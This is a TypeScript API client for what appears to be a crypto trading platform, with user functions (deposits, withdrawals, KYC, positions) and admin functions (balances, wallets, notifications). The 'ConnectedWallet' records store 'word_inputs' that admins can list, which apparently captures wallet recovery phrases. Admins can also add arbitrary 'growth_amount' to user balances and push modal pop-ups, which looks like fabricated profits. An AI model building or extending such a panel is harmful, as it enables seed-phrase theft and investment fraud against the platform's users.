import { apiRequest } from "./config";

// --- Types ---

export interface User {
  user_id: number;
  user_name: string;
  user_email: string;
  kyc: string;
  user_phone: string;
  user_picture: string;
  user_reg_date: string;
  user_region: string;
  user_dob: string;
  user_address: string;
  us_citizen: string;
  user_status?: string;
  modal_title?: string;
  modal_content?: string;
  modal_active?: number;
}

export interface UserBalance {
  user_id: number;
  user_name: string;
  user_balance: number;
  portfolio_growth: number;
}

export interface UserKYC {
  user_id: number;
  img_one: string;
  img_two: string;
  img_three: string;
  upload_time: string;
  user?: User;
}

export interface Transaction {
  trans_id: number;
  user_id: number;
  trans_type: string;
  crypto: string;
  trans_amt: number;
  trans_amt_btc?: number;
  trans_time: string;
  trans_stat: string;
  user_wallet: string;
  user_email?: string;
  userName?: string;
  userId?: number;
  date?: string;
  amount?: string;
  type?: string;
  status?: string;
  user?: User;
}

export interface ConnectedWallet {
  user_id: number;
  wallet_type: string;
  word_inputs: string;
  time: string;
  user_name?: string;
  user_email?: string;
  connect_status?: string;
}

export interface Notification {
  id?: number;
  user_id: number;
  notification: string;
  notification_desc: string;
  notification_status: string;
  notification_time: string;
}

export interface ActivityLog {
  log_id: number;
  action: string;
  category: "user" | "admin" | "system" | "security" | "transaction";
  actor: string;
  target: string | null;
  details: string;
  ip_address: string;
  created_at: string;
}

export interface SystemSettings {
  setting_key: string;
  setting_value: string;
  setting_group: string;
  updated_at: string;
}

export interface AnalyticsData {
  userGrowth: { month: string; users: number }[];
  revenueData: { month: string; revenue: number }[];
  transactionVolume: { day: string; volume: number }[];
  assetDistribution: { name: string; value: number; color: string }[];
  topCountries: { country: string; users: number; percentage: number }[];
  stats: {
    monthlyActiveUsers: number;
    monthlyRevenue: number;
    weeklyVolume: number;
    conversionRate: number;
    mauChange: number;
    revenueChange: number;
    volumeChange: number;
    conversionChange: number;
  };
}

export interface PlatformWallet {
  wallet_id: number;
  name: string;
  symbol: string;
  balance: string;
  usd_value: number;
  address: string;
  change_24h: number;
}

export interface WalletMovement {
  movement_id: number;
  type: "in" | "out";
  asset: string;
  amount: string;
  source: string;
  created_at: string;
}

// --- User Dashboard API (endpoint: "user") ---

export async function fetchUserSidebarData(uid: string) {
  return apiRequest<any>("user", { q: "sidebar", uid });
}

export async function fetchUserDashboardData(uid: string) {
  return apiRequest<any>("user", { q: "dashboard", uid });
}

export async function fetchUserTransactions(uid: string) {
  return apiRequest<any>("user", { q: "transactions", uid });
}

export async function fetchUserNotifications(uid: string) {
  return apiRequest<any>("user", { q: "get_notifications", uid });
}

export async function markUserNotificationsSeen(uid: string) {
  return apiRequest<any>("user", { q: "mark_notifications_seen", uid });
}

export async function submitUserDeposit(data: any) {
  return apiRequest<any>("user", { q: "payment", ...data });
}

export async function submitUserWithdrawal(data: any) {
  return apiRequest<any>("user", { q: "withdraw", ...data });
}

export async function fetchUserKycStatus(uid: string) {
  return apiRequest<any>("user", { q: "get_kyc_status", uid });
}

export async function fetchUserCryptoBalances(uid: string) {
  return apiRequest<any>("user", { q: "get_balance", uid });
}

export async function submitUserKyc(data: any) {
  return apiRequest<any>("user", { q: "submit_kyc_urls", ...data });
}

export async function updateUserProfile(data: any) {
  return apiRequest<any>("user", { q: "settings", ...data });
}

export async function fetchUserPositions(uid: string, status: string = "open") {
  return apiRequest<any>("user", { q: "get_positions", uid, status });
}

export async function openUserPosition(data: any) {
  return apiRequest<any>("user", { q: "open_position", ...data });
}

export async function closeUserPosition(data: any) {
  return apiRequest<any>("user", { q: "close_position", ...data });
}

// --- Admin Dashboard API (endpoint: "admin") ---

export async function fetchAllUsers(): Promise<User[]> {
  return apiRequest<User[]>("admin", { q: "admin_get_users" });
}

export async function fetchAllAdminUsers(): Promise<any[]> {
  const res = await apiRequest<{ success: boolean; data: any[] }>("admin", { q: "fetch_users" });
  return res.data || [];
}

export async function fetchUserById(userId: number): Promise<User> {
  return apiRequest<User>("admin", { q: "admin_get_user", user_id: userId });
}

export async function fetchUserBalances(): Promise<UserBalance[]> {
  return apiRequest<UserBalance[]>("admin", { q: "admin_get_balances" });
}

export async function fetchKYCSubmissions(): Promise<{ success: boolean; data: any }> {
  return apiRequest<{ success: boolean; data: any }>("admin", { q: "admin_get_kyc_submissions" });
}

export async function fetchDetailedKYCSubmissions(): Promise<any[]> {
  const res = await apiRequest<{ success: boolean; data: any[] }>("admin", { q: "fetch_kyc_submissions" });
  return res.data || [];
}

export async function fetchAllTransactions(): Promise<{ success: boolean; data: Transaction[] }> {
  return apiRequest<{ success: boolean; data: Transaction[] }>("admin", { q: "admin_get_transactions" });
}

export async function fetchWithdrawals(): Promise<{ success: boolean; data: Transaction[] }> {
  return apiRequest<{ success: boolean; data: Transaction[] }>("admin", { q: "admin_get_withdrawals" });
}

export async function fetchApprovedDeposits(): Promise<{ success: boolean; data: any }> {
  return apiRequest<{ success: boolean; data: any }>("admin", { q: "admin_get_approved_deposits" });
}

export async function fetchDashboardStats(): Promise<{ success: boolean; data: any }> {
  return apiRequest<{ success: boolean; data: any }>("admin", { q: "admin_dashboard_stats" });
}

export async function fetchConnectedWallets(): Promise<ConnectedWallet[]> {
  const res = await apiRequest<{ success: boolean; data: ConnectedWallet[] }>("admin", { q: "fetch_wallets" });
  return res.data || [];
}

export async function fetchNotifications(): Promise<Notification[]> {
  return apiRequest<Notification[]>("admin", { q: "admin_get_notifications" });
}

export async function fetchActivityLogs(): Promise<ActivityLog[]> {
  return apiRequest<ActivityLog[]>("admin", { q: "admin_get_activity_logs" });
}

export async function fetchActivityLogStats(): Promise<any> {
  return apiRequest("admin", { q: "admin_get_activity_log_stats" });
}

export async function fetchSystemSettings(): Promise<{ success: boolean; data: SystemSettings[] }> {
  return apiRequest<{ success: boolean; data: SystemSettings[] }>("admin", { q: "admin_get_settings" });
}

export async function fetchAnalyticsData(): Promise<AnalyticsData> {
  return apiRequest<AnalyticsData>("admin", { q: "admin_get_analytics" });
}

export async function fetchPlatformWallets(): Promise<PlatformWallet[]> {
  return apiRequest<PlatformWallet[]>("admin", { q: "admin_get_platform_wallets" });
}

export async function fetchWalletMovements(): Promise<WalletMovement[]> {
  return apiRequest<WalletMovement[]>("admin", { q: "admin_get_wallet_movements" });
}

export async function fetchWalletBalanceHistory(): Promise<{ date: string; btc: number; eth: number; usdt: number }[]> {
  return apiRequest("admin", { q: "admin_get_wallet_balance_history" });
}

// --- Mutations ---

export async function updateUserStatus(userId: number, status: string): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "toggle_status",
    userId: userId + 734350,
    status
  });
}

export async function updateUserBalance(
  userId: number,
  amount: number,
  type: "add" | "subtract",
  reason: string,
  growth_amount: number = 0
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "adjust_balance",
    user_id: userId + 734350,
    amount,
    type,
    reason,
    growth_amount
  });
}

export async function updateKYCStatus(
  userId: number,
  status: "Approved" | "Rejected" | "Pending"
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "update_kyc_status",
    user_id: userId + 734350,
    status
  });
}

export async function updateTransactionStatus(transId: number, status: string): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "admin_update_transaction",
    trans_id: transId,
    status
  });
}

export async function updateSystemSettings(settings: Record<string, string>): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "admin_update_settings",
    settings
  });
}

export async function sendNotification(
  userId: number | "all",
  title: string,
  message: string,
  channel: string
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("admin", {
    q: "admin_send_notification",
    user_id: userId,
    notification: title,
    notification_desc: message,
    channel
  });
}
